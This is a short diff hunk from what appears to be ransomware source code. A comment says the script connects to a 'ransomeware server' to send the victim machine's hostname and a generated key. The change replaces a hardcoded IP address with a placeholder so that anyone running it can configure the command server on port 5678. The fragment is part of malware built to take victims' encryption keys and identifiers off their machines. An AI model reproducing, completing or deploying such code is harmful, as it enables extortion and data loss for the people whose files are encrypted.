@@ -69,9 +69,8 @@ hostname = os.getenv("COMPUTERNAME")
 print(hostname)
 
 #connect to ransomeware server and send  the hostname and key that is generated
-#ip = "192.168.43.112"
 #host = socket.gethostname()
-host = "192.168.43.112"
+host = "your local ip"
 port = 5678
 time = datetime.now()
 
